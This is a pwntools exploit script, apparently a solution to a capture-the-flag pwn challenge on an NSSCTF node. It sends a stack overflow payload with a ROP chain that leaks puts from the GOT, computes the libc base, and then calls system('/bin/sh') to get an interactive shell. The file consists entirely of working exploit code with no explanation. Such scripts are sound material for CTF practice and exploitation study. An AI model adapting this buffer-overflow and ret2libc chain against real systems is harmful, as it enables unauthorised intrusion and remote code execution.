from pwn import *
from LibcSearcher import *

io = remote("node7.anna.nssctf.cn", 23187)
elf = ELF("./附件")
libc = ELF("./libc-2.23.so")

offset = 0x10 + 0x8

ret_addr = 0x400509
pop_rdi_addr = 0x400763

puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]

vuln_addr = 0x004006BA

payload1 = (
    b"A" * offset + p64(pop_rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)
)
io.sendline(payload1)

puts_addr = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
print("puts address: ", hex(puts_addr))
libc_base = puts_addr - libc.sym["puts"]
print("libc base address: ", hex(libc_base))

bin_sh_addr = libc_base + next(libc.search(b"/bin/sh\x00"))
system_addr = libc_base + libc.sym["system"]

payload = (
    b"a" * (0x10 + 8)
    + p64(ret_addr)
    + p64(pop_rdi_addr)
    + p64(bin_sh_addr)
    + p64(system_addr)
)

io.send(payload)

io.interactive()
